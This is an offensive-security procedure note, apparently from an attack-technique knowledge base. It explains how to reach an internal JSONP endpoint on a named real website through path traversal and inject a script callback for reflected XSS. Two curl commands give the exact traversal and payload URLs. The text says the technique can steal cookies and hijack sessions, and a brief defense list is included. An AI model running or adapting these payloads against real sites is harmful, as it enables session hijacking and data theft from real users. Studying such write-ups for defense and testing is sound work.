---
tags:
  - xss
  - jsonp
  - injection
  - web
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-callback]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:21.084Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 11c9b33a-203e-4451-b206-7e0af40c4f73
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Callback-for-XSS-in-JSONP-Endpoint

## Summary

This procedure exploits a path traversal to access an internal JSONP endpoint and injects a malicious callback function, resulting in reflected XSS that executes arbitrary JavaScript in the victim's browser, such as alerting the domain or stealing cookies.

## Description

Building on path traversal in the 'tags' parameter, this targets the internal /comments_dal/users/getGlobalLoginSettings.json endpoint, which returns JSONP-formatted data. The lack of callback validation allows injection of JavaScript like alert(document.domain), which executes when the response is parsed in the browser. This leads to session hijacking or data exfiltration. The attack requires victim interaction via a crafted URL and works on unsanitized web apps using JSONP.

## Requirements

1. Confirmed path traversal vulnerability from prior procedure
2. URL encoding knowledge for payloads (e.g., %28 for '(')
3. Victim browser to trigger the reflected payload

## Defense

Defensive measures and detection strategies:

- Validate and sanitize callback parameters in JSONP responses (e.g., prefix with safe strings)
- Disable JSONP or migrate to CORS for internal endpoints
- Implement Content Security Policy (CSP) to block inline JavaScript execution
- Monitor for anomalous JavaScript in logs or WAF alerts

## Objectives

1. Access internal JSONP endpoint via traversal
2. Execute reflected XSS payload in browser context
3. Demonstrate potential for data theft or session compromise

## Instructions

### Step 1: Craft Traversal to JSONP Endpoint

**Context**: Use traversal to reach the internal endpoint, confirming JSONP response availability.

**Command** ([[commands/curl-inject-xss-callback]]):
```bash
curl "http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json" -v
```

> Expect a JSONP-wrapped response; success if the endpoint data is returned without authentication blocks.

### Step 2: Inject and Test Malicious Callback

**Context**: Append a URL-encoded JavaScript payload as the callback to trigger XSS upon loading.

**Command** ([[commands/curl-inject-xss-callback]]):
```bash
curl "http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//" -v
```

> In a browser, load the URL to see the alert execute. The '//' comments out trailing JSON to prevent syntax errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-callback]]

## Tools Used

- [[tools/curl]]

## Tags

- xss
- jsonp-injection
